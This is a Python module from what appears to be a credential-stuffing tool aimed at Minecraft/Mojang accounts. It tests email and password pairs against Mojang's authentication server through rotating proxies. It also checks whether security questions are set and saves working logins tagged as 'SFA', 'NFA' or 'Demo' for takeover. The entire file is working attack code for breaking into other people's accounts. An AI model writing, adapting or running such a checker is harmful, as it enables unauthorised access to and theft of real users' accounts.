from modules.variables import Checker
from modules.functions import set_proxy,log,save, bad_proxy
from requests import get,post
from json import dumps

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)
        
        body = dumps({'agent': {'name': 'Minecraft','version': 1},'username': email,'password': password,'clientToken': "fff"})
        header_1 = {"Content-Type": "application/json", 'Pragma': 'no-cache'}
        header_2 = {'Pragma': 'no-cache', "Authorization": f""}
        try:
            r = post(url="https://authserver.mojang.com/authenticate",headers=header_1,data=body,timeout=Checker.timeout,proxies=proxy_set)
            if 'Invalid credentials' in r.text:
                retries += 1
            elif "[]" in r.text:
                if not Checker.cui:
                    log("custom",email+":"+password,"Minecraft")
                save("Minecraft","custom",Checker.time,email+":"+password+" | Demo")
                Checker.custom += 1
                Checker.cpm += 1
                return
            elif "accessToken" in r.text:
                accessToken = r.json()["accessToken"]
                header_2["Authorization"] = f"Bearer {accessToken}"
                z = get("https://api.mojang.com/user/security/challenges", headers=header_2,proxies=proxy_set,timeout=Checker.timeout).text
                if z == '[]':
                    if not Checker.cui:
                        log("good",email+":"+password,"Minecraft")
                    save("Minecraft","good",Checker.time,email+":"+password+" | SFA")
                    Checker.good += 1
                    Checker.cpm += 1
                    return
                else:
                    if not Checker.cui:
                        log("good",email+":"+password,"Minecraft")
                    save("Minecraft","good",Checker.time,email+":"+password+" | NFA")
                    Checker.good += 1
                    Checker.cpm += 1
                    return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1 
    Checker.cpm += 1
    return